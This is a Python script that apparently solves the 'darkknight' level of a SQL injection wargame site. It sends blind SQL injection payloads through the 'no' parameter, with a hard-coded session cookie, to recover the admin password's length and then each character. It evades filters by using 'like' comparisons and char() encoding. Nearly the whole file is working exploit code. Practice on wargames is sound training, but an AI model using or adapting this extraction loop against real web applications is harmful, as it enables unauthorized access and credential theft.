import requests

cookies={'PHPSESSID':'b61p6jj4h0n0rthn6uq0jjvdmr'}

for length in range(1,30):
    address="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php"
    url=address+"?no=1 || id like char(97,100,109,105,110) and length(pw) like "+str(length)+ " %23"
    res=requests.get(url,cookies=cookies)

    if "Hello admin" in res.text:
        print("비밀번호 길이는??:"+str(length))
        break
    else:
        print(str(length)+"자리 아님")

i=length
pw=""
for a in range(1,i+1):
    for b in range(48,123):
        url= address+"?no=1 || id like char(97,100,109,105,110) %26%26 ord(mid(pw,"+str(a)+",1)) like "+str(b)+" %23"
        res=requests.get(url,cookies=cookies)

        if"<h2>Hello admin</h2>" in res.text:
            print(str(a)+"of pw----------->"+str(chr(b)))
            pw=pw+chr(b)
            break
print(pw)
